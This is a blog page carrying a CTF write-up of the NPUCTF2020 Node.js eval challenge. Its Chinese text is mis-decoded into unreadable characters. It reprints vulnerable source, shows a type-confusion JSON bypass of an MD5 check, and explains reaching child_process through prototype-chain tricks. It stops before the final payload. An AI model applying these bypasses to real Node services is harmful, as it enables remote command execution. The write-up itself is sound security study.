        //   console.log("Âêë‰∏äÊªöÂä®");
        // }
        // Ê≥®ÈîÄËøáÊúüÁöÑunengineÊú™ÊªöÂä®‰∫ã‰ª∂
        volantis.scroll.unengine.list=[]
        volantis.scroll.engine.start();
      }else{
        volantis.scroll.unengine.start();
      }
      volantis.requestAnimationFrame(loop)
    }
    volantis.requestAnimationFrame(loop)
  }
  volantis.scroll.handleScrollEvents()
  volantis.scroll.ele = null;
  // Ëß¶ÂèëÈ°µÈù¢ÊªöÂä®Ëá≥ÁõÆÊ†áÂÖÉÁ¥†‰ΩçÁΩÆ
  volantis.scroll.to = (ele, option = {}) => {
    if (!ele) return;
    volantis.scroll.ele = ele;
    // ÈªòËÆ§ÈÖçÁΩÆ
    opt = {
      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
      behavior: "smooth"
    }
    // ÂÆö‰πâÈÖçÁΩÆ
    if ("top" in option) {
      opt.top = option.top
    }
    if ("behavior" in option) {
      opt.behavior = option.behavior
    }
    if ("addTop" in option) {
      opt.top += option.addTop
    }
    if (!("observerDic" in option)) {
      option.observerDic = 100
    }
    // ÊªöÂä®
    window.scrollTo(opt);
    // ÁõëËßÜÂô®
    // ÁõëËßÜÂπ∂Áü´Ê≠£ÂÖÉÁ¥†ÊªöÂä®Âà∞ÊåáÂÆö‰ΩçÁΩÆ
    // Áî®‰∫éÂ§ÑÁêÜ lazyload ÂºïËµ∑ÁöÑ cls ÂØºËá¥ÁöÑÂÆö‰ΩçÂ§±Ë¥•ÈóÆÈ¢ò
    // option.observer = false
    if (option.observer) {
      setTimeout(() => {
        if (volantis.scroll.ele != ele) {
          return
        }
        volantis.scroll.unengine.push(() => {
          let me = ele.getBoundingClientRect().top
          if(!(me >= -option.observerDic && me <= option.observerDic)){
            volantis.scroll.to(ele, option)
          }
          volantis.scroll.unengine.remove("unengineObserver")
        },"unengineObserver")
      },1000)
    }
  }
  /********************** Content Visibility ********************************/
  // ËßÅ source/css/first.styl Â¶ÇÊûúÈÅáÂà∞‰ªª‰ΩïÈóÆÈ¢ò Âà†Èô§ .post-story Âç≥ÂèØ
  // ‰∏Ä‰∏™ÂÖÉÁ¥†Ë¢´Â£∞Êòé content-visibility Â±ûÊÄßÂêé Â¶ÇÊûúÂÖÉÁ¥†‰∏çÂú® viewport ‰∏≠ ÊµèËßàÂô®‰∏ç‰ºöËÆ°ÁÆóÂÖ∂Âêé‰ª£ÂÖÉÁ¥†Ê†∑ÂºèÂíåÂ±ûÊÄß ‰ªéËÄåËäÇÁúÅ Style & Layout ËÄóÊó∂
  // content-visibility ÁöÑÂâØ‰ΩúÁî®: ÈîöÁÇπÂ§±Êïà Á≠âÁ≠â(ÂÆûÈ™åÂàùÊúü ÊöÇ‰∏çÊòéÁ°Æ), ‰ΩøÁî®Ê≠§ÊñπÊ≥ïÊ∏ÖÈô§Ê†∑Âºè
  volantis.cleanContentVisibility = ()=>{
    if (document.querySelector(".post-story")) {
      console.log("cleanContentVisibility");
      document.querySelectorAll(".post-story").forEach(e=>{
        e.classList.remove("post-story")
      })
    }
  }
  /******************************************************************************/
  /******************************************************************************/
  /******************************************************************************/
  //ÂõæÂÉèÂä†ËΩΩÂá∫ÈîôÊó∂ÁöÑÂ§ÑÁêÜ
  function errorImgAvatar(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg";
    img.onerror = null;
  }
  function errorImgCover(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg";
    img.onerror = null;
  }
  /******************************************************************************/
</script>

  <!-- import head_end begin -->
  <!-- import head_end end -->
  <!-- Custom Files headEnd begin-->
  
  <!-- Custom Files headEnd end-->
  <!-- front-matter head_end begin -->
  <!-- front-matter head_end end -->
</head>
  <body itemscope itemtype="http://schema.org/WebPage">
    <!-- import body_begin begin-->
    <!-- import body_begin end-->
    <!-- Custom Files bodyBegin begin-->
    
    <!-- Custom Files bodyBegin end-->
    <!-- front-matter body_begin begin -->
    <!-- front-matter body_begin end -->
    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
        
          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="ÂçöÂÆ¢"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>ÂçöÂÆ¢
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="ÂàÜÁ±ª"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>ÂàÜÁ±ª
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="ÂΩíÊ°£"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>ÂΩíÊ°£
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="ÂÖ≥‰∫é"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>ÂÖ≥‰∫é
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/more/" title="Êõ¥Â§ö"
                  
                  
                  
                    active-action="action-more"
                  >
                  <i class='fa-solid fa-info fa-fw'></i>Êõ¥Â§ö
                </a>
                
              </li>
            
          
          
				</ul>
			</div>
      
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fa-solid fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>
      

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" href="/" onclick="return false;" title="search"></a></li>
				
				<li>
          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" href="/" onclick="return false;" title="menu"></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="ÂçöÂÆ¢"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>ÂçöÂÆ¢
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="ÂàÜÁ±ª"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>ÂàÜÁ±ª
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="ÂΩíÊ°£"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>ÂΩíÊ°£
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="ÂÖ≥‰∫é"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>ÂÖ≥‰∫é
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/more/" title="Êõ¥Â§ö"
                  
                  
                  
                    active-action="action-more"
                  >
                  <i class='fa-solid fa-info fa-fw'></i>Êõ¥Â§ö
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>

      <!-- Custom Files header begin -->
      
      <!-- Custom Files header end -->
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
      <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
      <div id="none" class='cover-wrapper post search' style="display: none;">
        
  <div class='cover-bg lazyload placeholder' data-bg="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/10dc1ed9054de29b4eed4a6d6711cf06.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080"></div>

<div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">Jijoy ÁöÑ Blog</p>
    
    
      <p class="subtitle">Valar Morghulis</p>
    
  </div>
  <div class='bottom'>
    
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <input type="text" class="input u-search-input" placeholder="A Wonderful Theme for Hexo" />
          <i class="icon fa-solid fa-search fa-fw"></i>
        </form>
      </div>
    
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/v4/getting-started/"
              
              
              active-action="action-v4getting-started">
              <p>ÊñáÊ°£</p>
            </a>
          
            <a href="/faqs/"
              
              
              active-action="action-faqs">
              <p>Â∏ÆÂä©</p>
            </a>
          
            <a href="/examples/"
              
              
              active-action="action-examples">
              <p>Á§∫‰æã</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
      </div>
    
  
</div>

      <div id="safearea">
        <div class="body-wrapper">
          
<div id="l_main" class=''>
  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
  <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/30/nodeÂ∞èÁªÉ/">
  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="JijoyÁöÑblog">
  </span>
  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
    <meta itemprop="name" content="JijoyÁöÑblog">
    <meta itemprop="description" content="">
  </span>
  


  
    <span hidden>
      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
    </span>
  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title" itemprop="name headline">
        nodeÂ∞èÁªÉ
      </h1>
      <div class='new-meta-box'>
        
          
            
<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
  <a itemprop="url" class='author' href="/" rel="nofollow">
    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
    <p itemprop="name">ËØ∑ËÆæÁΩÆÊñáÁ´†‰ΩúËÄÖ</p>
  </a>
</div>

          
        
          
            

          
        
          
            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-05-30T16:57:46+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>ÂèëÂ∏É‰∫éÔºöMay 30, 2024</p>
  </a>
</div>

          
        
          
            



          
        
        <!-- Custom Files topMeta begin-->
        
        <!-- Custom Files topMeta end-->
      </div>
    
  </div>


  <div id="layoutHelper-page-plugins"></div>
  <div id="post-body" itemprop="articleBody">
    <h2 id="NPUCTF2020-È™åËØÅüêé"><a href="#NPUCTF2020-È™åËØÅüêé" class="headerlink" title="[NPUCTF2020]È™åËØÅüêé"></a>[NPUCTF2020]È™åËØÅüêé</h2><p>&#x2F;sourceÁªôÂà∞Ê∫êÁ†Å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const cookieSession = require(&#x27;cookie-session&#x27;);</span><br><span class="line"></span><br><span class="line">const fs = require(&#x27;fs&#x27;);</span><br><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line"></span><br><span class="line">const keys = require(&#x27;./key.js&#x27;).keys;</span><br><span class="line"></span><br><span class="line">function md5(s) &#123;</span><br><span class="line">  return crypto.createHash(&#x27;md5&#x27;)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(&#x27;hex&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  return eval(str);</span><br><span class="line">&#125; // 2020.4/WORKER1 Ê∑¶Ôºå‰∏äÊ¨°ÁöÑÂ∫ìÂ§™ÂûÉÂúæÔºåÊàëËá™Â∑±ÂÜô‰∫Ü‰∏Ä‰∏™</span><br><span class="line"></span><br><span class="line">const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();</span><br><span class="line">function render(results) &#123;</span><br><span class="line">  return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 ÂòøÂòøÔºåÁªôüë¥Áà™‚ëß</span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">Object.freeze(Object);</span><br><span class="line">Object.freeze(Math);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  let result = &#x27;&#x27;;</span><br><span class="line">  const results = req.session.results || [];</span><br><span class="line">  const &#123; e, first, second &#125; = req.body;</span><br><span class="line">  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123;</span><br><span class="line">    if (req.body.e) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">        result = &#x27;Wrong Wrong Wrong!!!&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    results.unshift(&#x27;Not verified!&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  if (results.length &gt; 13) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 2019.10/WORKER1 ËÄÅÊùøÂ®òËØ¥Â•πË¶ÅÁúãÂà∞Êàë‰ª¨ÁöÑÊ∫ê‰ª£Á†ÅÔºåÁî®Ë°åÊï∞ËÆ°ÁÆóKPI</span><br><span class="line">app.get(&#x27;/source&#x27;, function (req, res) &#123;</span><br><span class="line">  res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;);</span><br><span class="line">  res.send(fs.readFileSync(&#x27;./index.js&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;);</span><br><span class="line">  req.session.admin = req.session.admin || 0;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(&#x27;Start listening&#x27;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ÁÆÄÂçïÂÆ°ËÆ°ÔºåÂèëÁé∞ÊÄªÂÖ±ÈúÄË¶ÅÁªïËøá‰∏§Â±Ç</p>
<p>Á¨¨‰∏ÄÂ±ÇÔºö</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) </span><br></pre></td></tr></table></figure>

<p>Á¨¨‰∫åÂ±ÇÔºö</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>ÂéªÁúãÂà∞<strong>saferEval</strong>ÊñπÊ≥ï</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  return eval(str);</span><br></pre></td></tr></table></figure>

<p>ÂèëÁé∞ÂèëÁé∞‰ªñÂèØ‰ª•ËøîÂõûÊâßË°å‰ΩÜ‰πãÂâçÂ≠òÂú®‰∏Ä‰∏™Ê≠£Âàô</p>
<p>okÔºåÊàë‰ª¨ÂÖàÊù•ÁªïËøáÁ¨¨‰∏ÄÂ±Ç</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]))</span><br></pre></td></tr></table></figure>

<p>Âà©Áî®nodejsËØ≠Ë®ÄÁöÑÁâπÊÄßÁªïËøáÂº±ÊØîËæÉ</p>
<p><img src="/../image/572.png" class="lazyload" data-srcset="/../image/572.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="572"></p>
<p><img src="/../image/574.png" class="lazyload" data-srcset="/../image/574.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="573"></p>
<p>ÈÇ£‰πàÊàë‰ª¨Áõ¥Êé•ËæìÂÖ•<code>&#123;&quot;e&quot;:&quot;1+1&quot;,&quot;first&quot;:[1],&quot;second&quot;:&quot;1&quot;&#125;</code></p>
<p><img src="/../image/575.png" class="lazyload" data-srcset="/../image/575.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="575"></p>
<p>ÂèëÁé∞ËøîÂõûËÆ°ÁÆóÂÄºÔºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÊâßË°å‰∫Ü<strong>saferEval</strong>ÊñπÊ≥ï‰∏≠ÁöÑ<strong>eval</strong></p>
<p>ÈÇ£‰πà‰πüÂ∞±ÊòØÁªïËøá‰∫ÜÁ¨¨‰∏ÄÂ±ÇÁöÑÊ£ÄÊµãÔºåÈÇ£‰πàÊàë‰ª¨ÁúãÂà∞Á¨¨‰∫åÂ±ÇÔºåÈáçÁÇπ‰πüÂ∞±ÊòØ<strong>saferEval</strong>ÊñπÊ≥ï‰∏≠ÁöÑÊ≠£ÂàôÁªïËøá</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  return eval(str);</span><br></pre></td></tr></table></figure>

<p><code>(?:Math(?:\.\w+)?)</code>ÔºöÂåπÈÖç <code>Math.[0-9a-z]</code></p>
<p><code>[()+\-*/&amp;|^%&lt;&gt;=,?:]</code>ÔºöÂåπÈÖç‰∏≠Êã¨Âè∑ÂÜÖ‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶</p>
<p><code>(?:\d+\.?\d*(?:e\d+)?)</code>ÔºöÂåπÈÖç Êï∞Â≠óÂºÄÂ§¥ ‰∏Ä‰∏™ÊàñÈõ∂‰∏™ÁÇπ ‰∏Ä‰∏™ÊàñÈõ∂‰∏™ e[0-9]</p>
<p><code> /g</code> ÔºöÁ©∫Ê†º</p>
<p>ËøôÈáåÊàë‰ª¨ÂÖà‰∏çÊù•ÁªïËøáÔºåÂÖàÊù•Á°ÆÂÆöÊàë‰ª¨Ë¶ÅÂÅö‰ªÄ‰πàÔºåËøôÈáåË¶ÅÂéªÊâßË°åÂëΩ‰ª§Ëé∑ÂæóflagÔºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÂéªË∞ÉÁî®‰∏Ä‰∏™ÊñπÊ≥ïÊàñËÄÖÂáΩÊï∞ÔºåÈÇ£‰πàËøô‰∏™ÂáΩÊï∞‰ªéÂì™ÈáåÊù•Âë¢ÔºåËøôÈáåÂ∞±ÈúÄË¶ÅÁî®Âà∞JavaScript‰∏≠ÁöÑÂéüÂûãÈìæÁöÑÁÇπ</p>
<p><img src="/../image/576.png" class="lazyload" data-srcset="/../image/576.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="576"></p>
<p>Êó¢ÁÑ∂<code>Math.constructor.constructor</code>ËøîÂõûÁöÑÁ±ªÂûãÊñπÊ≥ïÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÈÄöËøáÈáçÊñ∞ÂÆö‰πâËøô‰∏™ÊñπÊ≥ïÊù•ËææÂà∞Êàë‰ª¨ÈúÄË¶ÅÁöÑÁõÆÁöÑ</p>
<p><img src="/../image/577.png" class="lazyload" data-srcset="/../image/577.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="577"></p>
<p>ËøôÈáåÂ∞±ÊòØÂÆûÁé∞‰∫ÜÊúÄÁÆÄÂçïÁöÑ‰∏Ä‰∏™Áõ∏Âä†ÂäüËÉΩ</p>
<p>okÔºåÈÇ£‰πàÂõûÂà∞Êàë‰ª¨ÁöÑÈ¢òÁõÆ‰∏äÔºåËøô‰∏™È¢òÁõÆË¶ÅÊ±ÇÊàë‰ª¨Áî®Ê≠£ÂàôÈáåÊã•ÊúâÁöÑÂ≠óÁ¨¶Êù•ÂÆåÊàêÂëΩ‰ª§ÊâßË°åÔºåÈÇ£‰πàÂæàÊòéÊòæÁöÑÊúâ‰∏§‰∏™ÈóÆÈ¢òÂá∫Áé∞Âú®Êàë‰ª¨ÁöÑÈù¢ÂâçÔºå‰∏Ä‰∏™ÊòØÂ¶Ç‰ΩïÂú®‰∏ç‰ΩøÁî®Â≠óÁ¨¶ÁöÑÊÉÖÂÜµ‰∏ãËæìÂÖ•ÂëΩ‰ª§ÔºåÂè¶‰∏Ä‰∏™ÊòØÂ¶Ç‰ΩïÂÆûÁé∞ÂáΩÊï∞ÁöÑË∞ÉÁî®</p>
<p>Á¨¨‰∏Ä‰∏™ËøòÊòØÊØîËæÉÂ•ΩËß£ÂÜ≥ÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáÁºñÁ†ÅËΩ¨Êç¢ËøõË°åÁªïËøáÔºåÁ¨¨‰∫å‰∏™Â∞±Á®çÂæÆÊØîËæÉÈ∫ªÁÉ¶ÔºåËøôÈáåË¶ÅÁî®Âà∞JavaScript‰∏≠ÁöÑ<code>=&gt;</code>Êù•ÂÆûÁé∞ÂáΩÊï∞ÁöÑËá™Ë∞É</p>
<p><img src="/../image/578.png" class="lazyload" data-srcset="/../image/578.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="578"></p>
<p>Ëøô‰∏§ÁßçÊñπÊ≥ïÂùáÂèØ‰ª•ÂÆûÁé∞ÂáΩÊï∞Ëá™Ë∞ÉÔºå‰ΩÜËøô‰∏™ÂæàÊòéÊòæÂè™ËÉΩÁî®<code>()</code></p>
<p>ÂáΩÊï∞Ëá™Ë∞ÉÊòéÁôΩ‰∫ÜÔºåÊàë‰ª¨Êù•ÁúãÊàë‰ª¨ÈúÄË¶ÅË∞ÉÁî®Âà∞‰ªÄ‰πàÂáΩÊï∞ÔºåËøôÈáåÂ∫îËØ•ÊòØÊØîËæÉÂ∏∏ËßÅÁöÑ<strong>child_process</strong>Â∫ìÔºåÂÆÉÊòØ‰∏Ä‰∏™bashËß£ÈáäÂô®ÔºåÂèØ‰ª•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÔºåÂÆÉÈáåÈù¢ÊúâÂæàÂ§öÂèØ‰ª•Áî®Êù•ËøõË°åÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞</p>
<blockquote>
<p>ÂºÇÊ≠•api:</p>
<p>‚Äã      exec(cmd, options, callback)</p>
<p>‚Äã      execFile(cmd, args, options, callback)</p>
<p>‚Äã      fork (Ê®°ÂùóË∑ØÂæÑ, args, options) &#x2F;&#x2F; ‰∏ç‰∏ÄÊ†∑ÁöÑÂú∞ÊñπÂú®‰∫éÂèØ‰ª•ÈÄö‰ø°</p>
<p>‚Äã      spawn(cmd, args, options)</p>
<p>ÂêåÊ≠•api:</p>
<p>‚Äã       execSync</p>
<p>‚Äã       execFileSync</p>
<p>‚Äã       pawnSync</p>
</blockquote>
<p>ËøôÈáåÈáçÁÇπÂ∞±Áúã‰∏§‰∏â‰∏™ÔºåÂÖ∂‰ªñÁöÑÁ≠âÂ¶ÇÊûúÊúâÁî®Âà∞Âú®‰ªîÁªÜÁúã</p>
<p><strong>execÁî®Ê≥ï</strong> ÔºöÊâßË°åshellËÑöÊú¨</p>
<p><strong>execFileÁî®Ê≥ï</strong> ÔºöÂèØ‰ª•ÊâßË°åÊñá‰ª∂</p>
<p><strong>execSync</strong>Âíå<strong>execFileSync</strong>ÂÆûÈôÖ‰∏é‰∏äËø∞‰∏§‰∏™‰ΩúÁî®Áõ∏ÂêåÔºå‰ΩÜÊòØÊâßË°åapiÂ≠òÂú®Â∑ÆÂºÇ</p>
<p>ËøôÈáåÂà©Áî®<code>process.mainModule.require</code>ËøõË°åÂØºÂÖ•</p>
<p>ÈÇ£‰πàÊàë‰ª¨Êù•ÊûÑÈÄ†payload</p>
